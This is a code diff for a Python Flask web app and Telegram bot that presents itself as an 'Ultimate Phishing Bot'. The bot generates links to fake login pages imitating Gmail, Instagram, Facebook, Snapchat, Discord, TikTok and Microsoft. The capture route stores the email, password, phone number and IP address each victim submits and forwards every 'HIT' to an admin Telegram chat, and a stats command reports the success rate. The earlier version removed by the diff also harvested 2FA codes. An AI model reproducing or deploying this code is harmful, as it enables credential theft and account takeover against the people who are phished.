@@ -3,6 +3,7 @@ import os
 import requests
 import threading
 import time
+import json
 
 app = Flask(__name__)
 
@@ -13,26 +14,12 @@ STATS = {'visits': 0, 'captures': 0}
 running = True
 last_update_id = 0
 
-SERVICES = {
-    '1': ('📧 Gmail', 'gmail'),
-    '2': ('📸 Instagram', 'insta'), 
-    '3': ('📘 Facebook', 'facebook'),
-    '4': ('👻 Snapchat', 'snapchat'),
-    '5': ('💬 Discord', 'discord'),
-    '6': ('🎵 TikTok', 'tiktok'),
-    '7': ('🔐 Microsoft', 'microsoft')
-}
-
-def send_msg(chat_id, text):
+def send_msg(chat_id, text, reply_markup=None):
+    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
+    if reply_markup:
+        data['reply_markup'] = json.dumps(reply_markup)
     try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                     data={'chat_id':chat_id,'text':text,'parse_mode':'HTML'}, timeout=5)
-    except: pass
-
-def send_keyboard(chat_id, text, keyboard):
-    try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                     data={'chat_id':chat_id,'text':text,'parse_mode':'HTML','reply_markup':json.dumps({'keyboard':keyboard,'resize_keyboard':True})}, timeout=5)
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=5)
     except: pass
 
 def bot_loop():
@@ -40,110 +27,149 @@ def bot_loop():
     while running:
         try:
             resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
-                              params={'offset':last_update_id+1,'timeout':20}).json()
+                              params={'offset': last_update_id + 1, 'timeout': 20}).json()
             if resp['ok']:
                 for update in resp['result']:
                     last_update_id = update['update_id']
                     msg = update['message']
                     cid = msg['chat']['id']
-                    txt = msg.get('text', '')
+                    txt = msg.get('text', '').lower().strip()
                     uid = msg['from']['id']
+                    username = msg['from'].get('username', 'User')
                     
+                    # GRAND WELCOME
                     if '/start' in txt:
-                        kb = [[f"{k}. {v[0]}" for k,v in SERVICES.items()]]
-                        send_keyboard(cid, 
-                                     "🎣 <b>Choose Service:</b>\n\n"
-                                     "Select karo aur perfect link milega! 🔥", kb)
+                        markup = {
+                            'inline_keyboard': [
+                                [{'text': '📧 Gmail', 'callback_data': f'gmail_{uid}'}],
+                                [{'text': '📸 Instagram', 'callback_data': f'insta_{uid}'}],
+                                [{'text': '📘 Facebook', 'callback_data': f'facebook_{uid}'}],
+                                [{'text': '👻 Snapchat', 'callback_data': f'snapchat_{uid}'}],
+                                [{'text': '💬 Discord', 'callback_data': f'discord_{uid}'}],
+                                [{'text': '🎵 TikTok', 'callback_data': f'tiktok_{uid}'}],
+                                [{'text': '🔐 Microsoft', 'callback_data': f'microsoft_{uid}'}],
+                                [{'text': '📊 Stats', 'callback_data': f'stats_{uid}'}]
+                            ]
+                        }
+                        send_msg(cid, 
+                                f"🎉 <b>WELCOME {username.upper()}!</b> 🎉\n\n"
+                                f"🔥 <b>Ultimate Phishing Bot</b>\n"
+                                f"🚀 Choose service below 👇\n\n"
+                                f"💎 Premium links ready!\n"
+                                f"📱 Perfect mobile UI\n"
+                                f"🎣 Capture everything!", markup)
+                        continue
                     
-                    elif txt in SERVICES:
-                        service_name, service_id = SERVICES[txt]
-                        url = f"https://myphish.onrender.com/phish/{service_id}/{uid}"
-                        send_msg(cid, f"✅ <b>{service_name}</b>\n\n"
-                                     f"🔗 <code>{url}</code>\n\n"
-                                     f"📱 Copy & send to target!")
+                    # CALLBACK HANDLER
+                    if 'callback_query' in update:
+                        query = update['callback_query']
+                        cid = query['message']['chat']['id']
+                        data = query['data']
+                        uid = int(data.split('_')[1])
+                        
+                        if data.startswith('gmail_'):
+                            url = f"https://myphish.onrender.com/phish/gmail/{uid}"
+                            send_msg(cid, f"✅ <b>Gmail Phishing Link</b>\n\n<code>{url}</code>")
+                        elif data.startswith('insta_'):
+                            url = f"https://myphish.onrender.com/phish/instagram/{uid}"
+                            send_msg(cid, f"✅ <b>Instagram Phishing Link</b>\n\n<code>{url}</code>")
+                        elif data.startswith('facebook_'):
+                            url = f"https://myphish.onrender.com/phish/facebook/{uid}"
+                            send_msg(cid, f"✅ <b>Facebook Phishing Link</b>\n\n<code>{url}</code>")
+                        elif data.startswith('snapchat_'):
+                            url = f"https://myphish.onrender.com/phish/snapchat/{uid}"
+                            send_msg(cid, f"✅ <b>Snapchat Phishing Link</b>\n\n<code>{url}</code>")
+                        elif data.startswith('discord_'):
+                            url = f"https://myphish.onrender.com/phish/discord/{uid}"
+                            send_msg(cid, f"✅ <b>Discord Phishing Link</b>\n\n<code>{url}</code>")
+                        elif data.startswith('tiktok_'):
+                            url = f"https://myphish.onrender.com/phish/tiktok/{uid}"
+                            send_msg(cid, f"✅ <b>TikTok Phishing Link</b>\n\n<code>{url}</code>")
+                        elif data.startswith('microsoft_'):
+                            url = f"https://myphish.onrender.com/phish/microsoft/{uid}"
+                            send_msg(cid, f"✅ <b>Microsoft Phishing Link</b>\n\n<code>{url}</code>")
+                        elif data.startswith('stats_'):
+                            rate = STATS['captures']/max(STATS['visits'],1)*100
+                            send_msg(cid, f"📊 <b>LIVE STATS</b>\n🎯 Captures: <code>{STATS['captures']}</code>\n👀 Visits: <code>{STATS['visits']}</code>\n✅ Success: <code>{rate:.1f}%</code>")
                     
-                    elif txt == '/stats':
-                        rate = STATS['captures']/max(STATS['visits'],1)*100
-                        send_msg(cid, f"📊 <b>STATS</b>\n"
-                                     f"🎯 Captures: <code>{STATS['captures']}</code>\n"
-                                     f"👀 Visits: <code>{STATS['visits']}</code>\n"
-                                     f"✅ Rate: <code>{rate:.1f}%</code>")
-                    
-                    elif txt == '/data' and str(cid) == ADMIN_CHAT_ID:
-                        if PHISHING_DATA:
-                            recent = PHISHING_DATA[-10:]
-                            data_text = "\n".join([f"🎣 <code>{d['email']} | {d['pass']}</code> [{d['service']}]" for d in recent])
-                            send_msg(cid, f"💾 <b>LATEST 10 HITS:</b>\n\n{data_text}")
-                        else:
-                            send_msg(cid, "📭 No captures yet!")
+                    # Admin commands
+                    if str(cid) == ADMIN_CHAT_ID:
+                        if txt == '/data':
+                            if PHISHING_DATA:
+                                recent = PHISHING_DATA[-10:]
+                                data_text = "\n".join([f"🎣 <code>{d['email']}:{d['pass']}</code> [{d['service']}]" for d in recent])
+                                send_msg(cid, f"💾 <b>RECENT CAPTURES:</b>\n\n{data_text}")
+                            else:
+                                send_msg(cid, "📭 No data yet!")
+                        
         except: pass
         time.sleep(1)
 
 @app.route('/')
 def home():
-    return f"<h1>🎣 PHISH BOT LIVE!</h1><pre>Visits: {STATS['visits']} | Captures: {STATS['captures']}</pre>"
+    return f"<h1>🎣 ULTIMATE PHISH LIVE!</h1><h2>Visits: {STATS['visits']} | Hits: {STATS['captures']}</h2>"
 
 @app.route('/phish/<service>/<int:user_id>')
 def phish(service, user_id):
     STATS['visits'] += 1
-    service_names = {'gmail':'Gmail', 'insta':'Instagram', 'facebook':'Facebook', 'snapchat':'Snapchat', 'discord':'Discord', 'tiktok':'TikTok', 'microsoft':'Microsoft'}
-    service_name = service_names.get(service, 'Account')
-    return render_template_string(LOGIN_TEMPLATE, service=service_name, user_id=user_id)
+    service_display = service.title()
+    return render_template_string(LOGIN_TEMPLATE, service=service_display, user_id=user_id)
 
 @app.route('/phish/<service>/<int:user_id>', methods=['POST'])
 def capture(service, user_id):
     STATS['captures'] += 1
     data = {
-        'email': request.form['email'],
-        'pass': request.form['password'],
+        'email': request.form.get('email', ''),
+        'pass': request.form.get('password', ''),
         'phone': request.form.get('phone', ''),
-        'otp': request.form.get('otp', ''),
         'service': service.upper(),
         'ip': request.remote_addr
     }
     PHISHING_DATA.append(data)
     
     if ADMIN_CHAT_ID:
-        send_msg(ADMIN_CHAT_ID, f"🎣 <b>{data['service']} HIT!</b>\n"
-                               f"📧 <code>{data['email']}</code>\n"
-                               f"🔑 <code>{data['pass']}</code>\n"
-                               f"📱 <code>{data['phone']}</code>")
+        send_msg(int(ADMIN_CHAT_ID), f"🎣 <b>{data['service']} HIT!</b>\n"
+                                   f"📧 <code>{data['email']}</code>\n"
+                                   f"🔑 <code>{data['pass']}</code>")
     
-    return '<script>alert("✅ Verified Successfully!");window.location="https://google.com";</script>'
+    return '''
+    <script>
+    alert("✅ Login Successful! Redirecting...");
+    window.location.href = "https://www.google.com";
+    </script>
+    '''
 
-LOGIN_TEMPLATE = """
+LOGIN_TEMPLATE = '''
 <!DOCTYPE html>
-<html><head><title>{{service}}</title>
+<html><head><title>{{service}} Login</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<style>body{margin:0;padding:20px 20px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
-.card{background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.2);padding:40px;max-width:380px;width:100%;text-align:center;}
-.logo{width:50px;margin:0 auto 20px;display:block;}
-h1{color:#333;margin:0 0 10px;font-size:24px;font-weight:600;}
-.tagline{color:#666;margin:0 0 30px;font-size:16px;}
-.input-group{position:relative;margin-bottom:20px;}
-input{width:100%;padding:16px 20px;border:2px solid #e1e5e9;border-radius:12px;box-sizing:border-box;font-size:16px;transition:all 0.3s;}
-input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1);}
-.btn{width:100%;padding:16px;background:linear-gradient(45deg,#667eea,#764ba2);color:white;border:none;border-radius:12px;font-size:18px;font-weight:500;cursor:pointer;transition:all 0.3s;}
-.btn:hover{background:linear-gradient(45deg,#5a67d8,#6b46c1);transform:translateY(-2px);}
-.footer{margin-top:25px;padding-top:20px;border-top:1px solid #eee;color:#888;font-size:14px;}
+<style>
+body{margin:0;padding:40px 20px;background:linear-gradient(135deg,#667eea,#764ba2);font-family:system-ui,min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:24px;box-shadow:0 25px 50px rgba(0,0,0,0.25);padding:40px;max-width:400px;width:100%;text-align:center}
+h1{color:#333;margin:0 0 15px;font-size:28px;font-weight:700}
+.tag{color:#666;margin:0 0 35px;font-size:16px}
+input{width:100%;padding:18px 20px;margin-bottom:20px;border:2px solid #e8ecf4;border-radius:16px;box-sizing:border-box;font-size:16px;transition:all .3s}
+input:focus{outline:none;border-color:#667eea;transform:translateY(-2px)}
+.btn{width:100%;padding:18px;background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;border:none;border-radius:16px;font-size:18px;font-weight:600;cursor:pointer;transition:all .3s}
+.btn:hover{transform:translateY(-3px);box-shadow:0 10px 25px rgba(102,126,234,0.4)}
+.footer{margin-top:30px;color:#999;font-size:14px}
 </style></head>
 <body>
 <div class="card">
-<img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMjUiIGN5PSIyNSIgcj0iMjUiIGZpbGw9IiM0Mjg1ZjQiLz4KPHRleHQgeD0iMjUiIHk9IjMyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj48L3RleHQ+Cjwvc3ZnPgo=">
-<h1>🔐 {{service}} Login</h1>
-<p class="tagline">Enter credentials to continue</p>
+<h1>🔐 {{service}}</h1>
+<p class="tag">Secure login required</p>
 <form method="POST">
-<div class="input-group"><input name="email" type="email" placeholder="Email or Username" required autocomplete="off"></div>
-<div class="input-group"><input name="password" type="password" placeholder="Password" required autocomplete="off"></div>
-<div class="input-group"><input name="phone" type="tel" placeholder="Phone Number (optional)"></div>
-<div class="input-group"><input name="otp" type="text" placeholder="2FA Code (if enabled)"></div>
+<input name="email" type="email" placeholder="Email / Username" required>
+<input name="password" type="password" placeholder="Password" required>
+<input name="phone" type="tel" placeholder="Phone (optional)">
 <input name="user_id" type="hidden" value="{{user_id}}">
 <input name="service" type="hidden" value="{{service}}">
-<button class="btn" type="submit">🔓 Verify Account</button>
+<button class="btn" type="submit">🚀 Continue</button>
 </form>
-<p class="footer">Secure authentication required</p>
-</div></body></html>
-"""
+<div class="footer">Protected by security</div>
+</div>
+</body></html>
+'''
 
 if __name__ == '__main__':
     threading.Thread(target=bot_loop, daemon=True).start()
